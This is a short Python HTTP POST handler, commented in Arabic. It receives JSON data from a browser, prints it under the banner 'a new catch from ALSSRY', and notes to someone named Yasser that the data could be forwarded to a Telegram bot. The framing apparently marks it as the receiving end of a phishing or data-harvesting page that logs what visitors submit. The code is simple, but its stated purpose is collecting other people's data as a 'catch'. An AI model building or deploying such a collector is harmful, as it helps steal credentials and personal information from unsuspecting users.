from http.server import BaseHTTPRequestHandler
import json

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # قراءة حجم البيانات القادمة
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # تحويل البيانات من JSON إلى قاموس بايثون
        data = json.loads(post_data.decode('utf-8'))

        # هنا "مربط الفرس" يا ياسر.. تقدر تطبع البيانات أو ترسلها لبوت تليجرام
        print(f"--- صيدة جديدة من ALSSRY ---")
        print(f"البيانات: {json.dumps(data, indent=2, ensure_ascii=False)}")

        # الرد على المتصفح عشان ما يعلق العداد
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "success"}).encode())
